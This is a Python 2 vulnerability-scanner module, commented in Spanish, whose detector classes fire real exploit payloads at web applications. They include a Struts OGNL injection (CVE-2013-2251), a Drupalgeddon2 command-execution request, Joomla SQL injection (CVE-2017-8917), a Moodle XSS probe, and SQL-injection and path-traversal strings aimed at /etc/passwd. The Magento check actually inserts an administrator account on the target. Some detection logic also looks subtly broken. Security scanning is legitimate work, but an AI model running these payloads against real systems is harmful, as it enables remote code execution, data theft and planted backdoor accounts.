#!/usr/bin/env python2
import base64
import requests
import subprocess
import re
from subprocess import check_output
from utils import parseurls
try: from colorama import init, Fore,Back, Style
except: pass

"""
El objeto req tiene metodos para realizar peticiones http
Se encuentra definido en request/rutils
El metodo que verifica la vulnerabilidad es launchExploitsF 
cada modulo debe definir su comportamiento en este metodo
"""
class vulndetector(object):
	def __init__(self,req=None,color=False):
		try:
			init(convert=True,autoreset=True) # colorama
		except:
			pass
		self.color = False
		self.name = 'vulndetector'
		# Elementos para explotar
		self.headers = []
		self.filelist = []
		self.wordpatterns = []
		# holder cms root
		self.cmsroot = None
		# flags to search in external tool output
		self.toolflags = []
		# Objeto para realizar las peticiones
		self.req = req
		self.toolpath = None
		self.defaultdirs = []
		self.defaultfiles = []
		self.dicdefdirs = {}
		self.detections = []
		self.toolargs = []
		# elementos pasados como llamadas del modulo postcrawling
		self.resources = []
		# bandera para ejecucion individual (por cada recurso)
		self.standalone = False
		# Salida de la herramienta externa
		#self.output = None
		# Puntuacion del detector
		self.puntuation = 0	
		self.cmsroot = None
	
	#working
	def getName(self): return self.name
	
	# Busca por la carga del header h:key busca key
	def fromHeaders(self,rheaders,direccion):
		print 'vulndetection@fromHeaders'
		
	# Busca las cadenas (regexp) de wordpatterns en el codigo html
	def fromCode(self,rcode,direccion):
		print 'vulndetection@fromCode'
	
	# Detecta mediante la url (nombre del archivo)
	def fromFilename(self,filename):
		if self.standalone:
			print 'Running exploit from filename module ',self.name
			self.launchExploitFilename(filename)
	
	"""
	El metodo que checa las vulnerabilidades se llama despues de que
	se le asignan los recursos a este modulo en vulncontroller@setResources
	"""
	def launchExploitsF(self):
		if len(self.resources) > 0:
			for res in self.resources:
				print 'res %s' % res
		
	def hasDetections(self):
		if len(self.detections) > 0:
			return True
		return False
	
	def getResults(self):
		if self.hasDetections():
			return self.detections
			
	# Agrega recursos a analizar por los modulos de deteccion
	def setResources(self,reslist,cmsroot=None):
		#print 'Soy %s y recibi resources %s' % (self.name,reslist)
		self.resources = reslist
		if cmsroot is not None:
			self.cmsroot = cmsroot
		
	def launchExploitFilename(self,filename):
		print 'exploit template'
		
	"""
	def checkvulnerability(self,reqobj):
		print 'vuln check template'
	"""
	
	def getPuntuation(self):
		return self.puntuation
		
	#working
	def __str__(self):
		return "\nName %s\nStandalone %s" % (self.name,self.standalone)

	
# done
class strutscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'struts'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.standalone = True
		self.toolpath = None
		self.postcrawl = True
		self.detections = []
		self.resources = []
		self.toolargs = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = True

	def launchExploitFilename(self,dirurl):
		if self.launchExploitCVE_2013_2251(dirurl):
			cve = 'CVE2013-2251'
			print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
			#print "VULNERABLE TO CVE2013-2251: ",dirurl
		
	def launchExploitCVE_2013_2251(self,dirurl):
		cve = 'cve-2013-2251'
		#?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%22truerandom%22%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
		payload = ("?%72%65%64%69%72%65%63%74%3a%24%7b%23%72%65%71%3d"
		"%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70"
		"%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69"
		"%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74"
		"%52%65%71%75%65%73%74%27%29%2c%23%61%3d%23%72%65%71%2e%67%65"
		"%74%53%65%73%73%69%6f%6e%28%29%2c%23%62%3d%23%61%2e%67%65%74"
		"%53%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%28%29%2c%23%63%3d"
		"%23%62%2e%67%65%74%52%65%61%6c%50%61%74%68%28%22%2f%22%29%2c"
		"%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27"
		"%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f"
		"%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53"
		"%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61"
		"%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74"
		"%6c%6e%28%22%74%72%75%65%72%61%6e%64%6f%6d%22%2e%74%6f%55%70"
		"%70%65%72%43%61%73%65%28%29%29%2c%23%6d%61%74%74%2e%67%65%74"
		"%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61"
		"%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d"
		)
		tocheck = 'TRUERANDOM'
		fullurl = dirurl+payload
		#print 'testing %s' % fullurl
		response = self.req.getHTMLCode(fullurl)
		try:
			if tocheck in response.text:
				#self.detections.append("[ "+fullurl+" ] ====== "+cve)
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =====")
				return True
			return False
		except Exception as e:
			print 'excepcion cachada '+str(e)
			return False
			
class drupalscan(vulndetector):
	def __init__(self,req,color=False):
		#print 'Entre a drupalscan vuln'
		self.name = 'drupal'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	# Busca vulnerabilidades especificas, a partir de la raiz
	def launchExploitsF(self):
		#Aqui debo probar para cada recurso encontrado alguna vulne asociada
		# resources to test on
		#print 'debug: entre a launch exploitF'
		#print 'cmsroot ',self.cmsroot
		if self.cmsroot is not None:
			#print 'probando xmlrpc en %s cmsroot es %s' % (self.name,self.cmsroot)
			self.launchXMLRPC()
			self.launchDrupalgeddon2()
		
	def launchXMLRPC(self):
		cve = 'xmlrpc'
		dirurl = self.cmsroot+'xmlrpc.php'
		#print 'debug dirurl',dirurl
		#print 'trying xmlrpc'
		#print ' dirurl ',dirurl
		response = self.req.getHTMLCode(dirurl)
		tocheck = 'XML-RPC'
		try:
			if response is not None and tocheck in response.text:
				print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
				self.detections.append("[ "+dirurl+" ] ====== VULNERABLE TO: "+cve+" ========")
				return True
			return False
		except Exception as e:
			return False

	def launchDrupalgeddon2(self):
		if self.cmsroot is None: return False
		cve = 'drupalgeddon2'
		tocheck = 'MTMzNw=='
		dirurl = self.cmsroot
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'echo base64_encode(1337)', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		# s es el objeto session de el objeto req
		try:
			response = self.req.s.post(self.cmsroot, data=post_params, params=get_params,timeout=4,verify=False)
			if response is not None and tocheck in response.text:
				#print response.text
				self.detections.append("[ "+dirurl+" ] ====== VULNERABLE TO: "+cve+" ======\n")
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				return True
			return False
		except Exception as e:
			print e
			return False
			
class wordpresscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'wordpress'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		# resources to test on
		if self.cmsroot is not None:
			self.launchXMLRPC()
			self.SimpleSocialButtons()
	def launchXMLRPC(self):
		#print 'WORDPRESS VULN trying xmlrpc'
		cve = 'xmlrpc methods exposed'
		datos = """
		<?xml version="1.0"?>
		<methodCall><methodName>system.listMethods</methodName>
			<params><param></param></params>
		</methodCall>
		"""
		fullurl = self.cmsroot+'xmlrpc.php'
		#print "fullurl ",fullurl
		try:
			response = self.req.s.post(fullurl,data=datos)
		except Exception as e:
			print e
			return False
		tocheck = '<string>system.multicall</string>'
		try:
			if tocheck in response.text:
				#print 'es vulnerable ',fullurl
				
				#print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				print response.text
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" ===========" + response.text)
				return True
			return False
		except Exception as e:
			print 'excepcion cachada '+str(e)
			return False

	def SimpleSocialButtons(self):
			#print 'WORDPRESS VULN trying xmlrpc'
			cve = 'Simple Social Buttons'
			fullurl = self.cmsroot+'/wp-content/plugins/simple-social-buttons/readme.txt'
			#print "fullurl ",fullurl
			try:
				response = self.req.s.get(fullurl)
			except Exception as e:
				print e
				return False
			tocheck = 'Simple Social Media Share Buttons'
			try:
				if tocheck in response.text:
					#print 'es vulnerable ',fullurl
					
					#print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
					print '*'*(len(cve)+15),'\nPossible vulnerable to %s\n' % cve,'*'*(len(cve)+15)
					print response.text
					self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" ===========")
					return True
				return False
			except Exception as e:
				print 'excepcion cachada '+str(e)
				return False
			
class joomlascan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'joomla'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		# resources to test on
		if self.cmsroot is not None:
			self.launchCVE_2017_8917()
		
	def launchCVE_2017_8917(self):
		#print 'DRUPAL VULN trying xmlrpc'
		cve = 'Joomla com_fields SQL Injection (CVE-2017-8917)'
		fullurl = self.cmsroot+'/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,truerandomtruerandom),1)'
		#print "fullurl ",fullurl
		response = self.req.getHTMLCode(fullurl)
		tocheck = 'truerandomtruerandom'
		try:
			if tocheck in response.text:
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				res = ''
				try:
					m = re.search('Unknown column .*',response.text)
					if m: res = m.group(0)
				except Exception as e:
					pass
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =========="+res)
				return True
			return False
		except Exception as e:
			print 'excepcion cachada '+str(e)
			return False

class moodlescan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'moodle'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		# resources to test on
		if self.cmsroot is not None:
			self.launchXSS_PHPCOVERAGE()
		
	def launchXSS_PHPCOVERAGE(self):
		#print 'DRUPAL VULN trying xmlrpc'
		cve = 'PHPCOVERAGE_HOME Cross Site Scripting'
		fullurl = self.cmsroot+'/lib/spikephpcoverage/src/phpcoverage.remote.top.inc.php?PHPCOVERAGE_HOME=%3Cscript%3Ealert(%22truerandom%22)%3C/script%3E'
		#print "fullurl ",fullurl
		response = self.req.getHTMLCode(fullurl)
		tocheck = '<script>alert("truerandom")</script>'
		try:
			if tocheck in response.text:
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =====")
				return True
			return False
		except Exception as e:
			print 'excepcion cachada '+str(e)
			return False
			
class magentoscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'magento'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = False
		self.cmsroot = None

	def launchExploitsF(self):
		# resources to test on
		if self.cmsroot is not None:
			self.accountCreation()
			
	def accountCreation(self):
		print 'accountCreation'
		SQLQUERY="""
		SET @SALT = 'rp';
		SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
		SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
		INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
		INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
		"""
		# Put the nice readable queries into one line,
		# and insert the username:password combinination
		query = SQLQUERY.replace("\n", "").format(username="truerandom", password="truerandomtruerandom")
		pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
		cve = 'Admin Account creation'
		fullurl = self.cmsroot+'index.php/admin/Cms_Wysiwyg/directive/index/'
		#print "fullurl ",fullurl
		r = self.req.s.post(fullurl,data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ","filter": base64.b64encode(pfilter),"forwarded": 1})
		try:
			if r.ok:
				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve + "  ==== Login as admin with truerandom:truerandomtruerandom")
				return True
			return False
		except Exception as e:
			print 'exception '+str(e)
			return False
			
class xssscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'xssscan'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = True
		self.cmsroot = None
		
	def launchExploitFilename(self,dirurl):
		if self.testXSS(dirurl):
			print "VULNERABLE TO XSS: ",dirurl
	
	def testXSS(self,dirurl):
		#print('DEBUG : xssscan : testXSS', dirurl)
		cve = 'XSSVULN'	
		payload = ("")
		tocheck = '<script>alert(/TRUERANDOM/)</script>'
		injection_points= parseurls.get_injection_points(dirurl)
		#print(type(injection_points))
		if injection_points is None: return
		#print('injection_points is not none')
		for injection_point in injection_points:
			# TODO: add data structure
			#print('DEBUG : xssscan : testXSS ',injection_point)
			"""
			full_url = injection_point[1].replace('{TO_REPLACE}',tocheck)
			try:
				res = self.req.getHTMLCode(full_url)
			except Exception as e:
				pass
			if res is not None and res.text is not None:
				if tocheck in res.text:
					print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
					toappend = "[ "+injection_point+" ] ====== VULNERABLE TO: "+cve+" ====="
					if toappend not in self.detections:
						self.detections.append(toappend)
						print('full_url es: %s' % full_url)
						return True
			"""
		return False					
					
class sqliscan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'sqliscan'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = True
		self.cmsroot = None
		self.pat = re.compile('ERROR|MYSQL|SYNTAX',re.IGNORECASE)
		# Diccionarios
		# recurso: variable
		# Si la variable ya existe con la llave recurso entonces skip
		# Sino verifico y pruebo
		self.already_tested_error_sqli = {}
		self.already_tested_blind_sqli = {}
		self.already_tested_union_sqli = {}
		
	def launchExploitFilename(self,dirurl):
		if self.testSQLi(dirurl):
			print "VULNERABLE TO SQLi: ",dirurl
		
	def testSQLi(self,dirurl):
		self.error_based_sqli(dirurl)
		self.blind_sqli(dirurl)
		self.union_sqli(dirurl)
	
	"""
	self.already_tested_error_sqli = 
	{
		'base_url1' = [var1_tested,var2_tested,...,varn_tested]
		'base_url2' = [var1_tested,var2_tested,...,varn_tested]
	}
	if 'base_url' not in dicc: dicc['base_url'] = []
	if var_name not in dicc['base_url']: analize
	"""
	def error_based_sqli(self,dirurl):
		print('DEBUG: error_based_sqli: already tested: ')
		print(self.already_tested_error_sqli)
		print('DEBUG: error_based_sqli: testing %s' % dirurl)
		cve = 'SQLi (Error Based)'
		payload = "'"
		injection_points = parseurls.get_injection_points(dirurl)
		if injection_points is None: return 
		orig_url = dirurl
		sql_keywords = ["error","mysql","syntax","manual","server"] # TODO: add pgsql|mssql... keywords
		sql_payloads = ["1","1'","a'","a'-"]
		# injection_point = (url_recurso,url?var_to_inject=placeholder&var2=val...&varn=valn)
		for injection_point in injection_points:
			# url_resource = dom/resource
			url_resource,url_to_inject,var_name = injection_point
			#print('url_resource: %s ' % url_resource)
			#print('url_to_inject: %s ' % url_to_inject)
			#print('var_name: %s ' % var_name)
			# la base_url
			if url_resource not in self.already_tested_error_sqli:
				self.already_tested_error_sqli[url_resource] = []
			if var_name not in self.already_tested_error_sqli[url_resource]:
				print('DEBUG:sqliscan@errorbased : [i] trying to inject: %s' % url_to_inject)
				for sql_p in sql_payloads:
					mod_url = url_to_inject.replace("{TO_REPLACE}",sql_p)
					words_not_in_orig_req = self.req.word_not_in_response(sql_keywords,orig_url)
					words_not_in_mod_req = self.req.word_not_in_response(sql_keywords,mod_url)
					if words_not_in_orig_req != words_not_in_mod_req:
						print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
						toappend = "[ "+url_to_inject+" ] ====== VULNERABLE TO: "+cve+" ====="
						if toappend not in self.detections:
							self.detections.append(toappend)
							self.already_tested_error_sqli[url_resource].append(var_name)
						return True
				self.already_tested_error_sqli[url_resource].append(var_name)
		"""
		for injection_point in injection_points:
			if injection_point not in self.already_tested_error_sqli:
				for sql_p in sql_payloads:
					mod_url = injection_point.replace("{TO_REPLACE}",sql_p)
					words_not_in_orig_req = self.req.word_not_in_response(sql_keywords,orig_url)
					words_not_in_mod_req = self.req.word_not_in_response(sql_keywords,mod_url)
					if words_not_in_orig_req != words_not_in_mod_req:
						print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
						toappend = "[ "+injection_point+" ] ====== VULNERABLE TO: "+cve+" ====="
						if toappend not in self.detections:
							self.detections.append(toappend)
						return True
				self.already_tested_error_sqli.append(injection_point)
		"""
		return False	
	
	"""
	self.already_tested_blind_sqli = 
	{
		'base_url1' = [var1_tested,var2_tested,...,varn_tested]
		'base_url2' = [var1_tested,var2_tested,...,varn_tested]
	}
	if 'base_url' not in dicc: dicc['base_url'] = []
	if var_name not in dicc['base_url']: analize
	"""	
	def blind_sqli(self,dirurl):
		"""
		print('DEBUG: blind_based_sqli: already tested: ')
		print(self.already_tested_blind_sqli)
		print('DEBUG: blind_based_sqli: testing %s' % dirurl)
		"""
		cve = 'SQLi (Blind Based)'
		payload = "'"
		injection_points = parseurls.get_injection_points(dirurl)
		if injection_points is None: return 
		# true_cases,false_cases = [(AND TRUE,AND FALSO)]
		# if resp[orig_url] == resp[true_cases and resp[orig_url] != resp[false_case]
		blind_cases  = [
			("1","1 AND 2=2","1 AND 2=3"),
			("1","1 AND 2>1","1 AND 2>3"),
			("1","1 AND 2=2 -- -v","1 AND 2=3 -- -v"),
			("1","1 AND 2>1 -- -v","1 AND 2>3 -- -v"),
			("a","a' AND '1'='1","a' AND '1'='2"),
			("a","a' AND '2'='2","a' AND '2'='3"),
			("a","a' AND '2'='2' -- -v","a' AND '2'='3' -- -v"),
			("a","a' AND '2'>'1' -- -v","a' AND '2'>'3' -- -v")
		]
		for injection_point in injection_points:
			url_resource,url_to_inject,var_name = injection_point
			if url_resource not in self.already_tested_blind_sqli:
				self.already_tested_blind_sqli[url_resource] = []
			if var_name not in self.already_tested_blind_sqli[url_resource]:
				#print('DEBUG:sqliscan@blindbased :\n[i] trying to inject: %s' % url_to_inject)
				for sql_p in blind_cases:
					base_case,true_case,false_case = sql_p
					
					base_url = url_to_inject.replace("{TO_REPLACE}",base_case)
					true_url = url_to_inject.replace("{TO_REPLACE}",true_case)
					false_url = url_to_inject.replace("{TO_REPLACE}",false_case)
					"""
					print('\nDEBUG:sqliscan@blindbased[BaseCase]:\n%s' % base_url)
					print('DEBUG:sqliscan@blindbased[TrueCase]:\n%s' % true_url) 
					print('DEBUG:sqliscan@blindbased[FalseCase]:\n%s' % false_url) 
					"""
					try:
						base_r = self.req.getHTMLCode(base_url)
						true_r = self.req.getHTMLCode(true_url)
						false_r = self.req.getHTMLCode(false_url)
					except Exception as e: pass
					
					if (true_r is not None and true_r.text is not None and
						false_r is not None and false_r.text is not None and
						base_r is not None and base_r.text is not None):
						if true_r.text == base_r.text and true_r.text != false_r.text:
							print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
							toappend = "[ "+injection_point+" ] ====== VULNERABLE TO: "+cve+" ====="
							if toappend not in self.detections:
								self.detections.append(toappend)
						self.already_tested_blind_sqli[url_resource].append(var_name)
						return True
				self.already_tested_blind_sqli[url_resource].append(var_name)
		return False	
		
	def union_sqli(self,dirurl):
		"""
		print('DEBUG: union_based_sqli: already tested: ')
		print(self.already_tested_union_sqli)
		print('DEBUG: union_based_sqli: testing %s' % dirurl)
		"""
		cve = 'SQLi (UNION BASED)'
		payload = "'"
		injection_points = parseurls.get_injection_points(dirurl)
		if injection_points is None: return 
		union_cases  = [
			("1","1 ORDER BY 1","1 ORDER BY 10000"),
			("1'","1' ORDER BY 1 -- -v","1' ORDER BY 10000 -- -v"),
			("a'","a' ORDER BY 1 -- -v","a' ORDER BY 10000 -- -v")
		]
		for injection_point in injection_points:
			url_resource,url_to_inject,var_name = injection_point
			if url_resource not in self.already_tested_union_sqli:
				self.already_tested_union_sqli[url_resource] = []
			if var_name not in self.already_tested_union_sqli[url_resource]:
				#print('DEBUG:sqliscan@unionbased :\n[i] trying to inject: %s' % url_to_inject)
				for sql_p in union_cases:
					base_case,true_case,false_case = sql_p
					
					base_url = url_to_inject.replace("{TO_REPLACE}",base_case)
					true_url = url_to_inject.replace("{TO_REPLACE}",true_case)
					false_url = url_to_inject.replace("{TO_REPLACE}",false_case)
					"""
					print('\nDEBUG:sqliscan@unionbased[BaseCase]:\n%s' % base_url)
					print('DEBUG:sqliscan@blindbased[ValidCase]:\n%s' % true_url) 
					print('DEBUG:sqliscan@blindbased[InvalidCase]:\n%s' % false_url) 
					"""
					try:
						base_r = self.req.getHTMLCode(base_url)
						true_r = self.req.getHTMLCode(true_url)
						false_r = self.req.getHTMLCode(false_url)
					except Exception as e: pass
					
					if (true_r is not None and true_r.text is not None and
						false_r is not None and false_r.text is not None and
						base_r is not None and base_r.text is not None):
						if true_r.text == base_r.text and true_r.text != false_r.text:
							print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
							toappend = "[ "+injection_point+" ] ====== VULNERABLE TO: "+cve+" ====="
							if toappend not in self.detections:
								self.detections.append(toappend)
						self.already_tested_union_sqli[url_resource].append(var_name)
						return True
				self.already_tested_union_sqli[url_resource].append(var_name)
		return False

class path_traversal_scan(vulndetector):
	def __init__(self,req,color=False):
		self.name = 'path_traversal_scan'
		self.color = color
		self.req = req
		self.cmsroot = None
		self.toolflags = []
		self.headers = []
		self.filelist = ['']
		self.wordpatterns = ['']
		self.defaultdirs = ['']
		self.defaultfiles = ['']
		self.dicdefdirs = {}
		self.toolpath = None
		self.standalone = False
		self.postcrawl = True
		self.detections = []
		self.toolargs = []
		self.resources = []
		#self.output = None
		# Puntuacion de este scanner
		self.puntuation = 0	
		self.standalone = True
		self.cmsroot = None
		# preffix file suffix
		self.path_files = {'/etc/passwd':'root:x:0:0:root:/root:',
			'/etc/group':'root:x:0:',
			'C:/Windows/system.ini':'; for 16-bit app support',
			'C:/Windows/win.ini':'; for 16-bit app support'
		}
		self.preffixes = ['','../../../../../',
			"..\\..\\..\\..\\..\\",
			"..\/,..\/,..\/..\/,..\/",
			"%2e%2e%2f%2e%2e%2f"
		]
		self.suffixes = ['','%00']
		self.already_tested = {}
		
	def launchExploitFilename(self,dirurl):
		#print('DEBUG: path_traversal ',dirurl)
		if self.test_traversal(dirurl):
			print "VULNERABLE TO PATH TRAVERSAL: ",dirurl
	
	def test_traversal(self,dirurl):
		print('DEBUG:path_traversal: already tested: ')
		print(self.already_tested)
		print('DEBUG:path_traversal: testing %s' % dirurl)
		cve = 'Path traversal'
		payload = "'"
		try:
			orig_resp = self.req.getHTMLCode(dirurl)
		except Exception as e:
			return False
		if orig_resp is None or orig_resp.text is None: return
		injection_points = parseurls.get_injection_points(dirurl)
		if injection_points is None: return 
		for injection_point in injection_points:
			url_resource,url_to_inject,var_name = injection_point
			if url_resource not in self.already_tested:
				self.already_tested[url_resource] = []
			if var_name not in self.already_tested[url_resource]:
				print('DEBUG:path_traversal@test :\n[i] trying dotdot: %s' % url_to_inject)
				for key in self.path_files:
					# we find those strings that don't appear on orig_resp
					if self.path_files[key].lower() not in orig_resp.text.lower():
						for pfx in self.preffixes:
							for sufx in self.suffixes:
								#print('[*] inj_ppt: %s' % injection_point)
								new_url = url_to_inject.replace('{TO_REPLACE}',"%s" % ('%s%s%s'% (pfx,key,sufx)))
								#print('[*] new_url: %s' % new_url)
								try:
									print('[i] testing path traversal: %s ' % new_url) 
									new_resp = self.req.getHTMLCode(new_url)
								except Exception as e: pass
								if (new_resp is not None and 
									new_resp.text is not None and
									self.path_files[key].lower() in new_resp.text.lower()
								):
									print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
									toappend = "[ "+new_url+" ] ====== VULNERABLE TO: "+cve+" ====="
									if toappend not in self.detections:
										self.already_tested[url_resource].append(var_name)
										return True
				self.already_tested[url_resource].append(var_name)
		return False
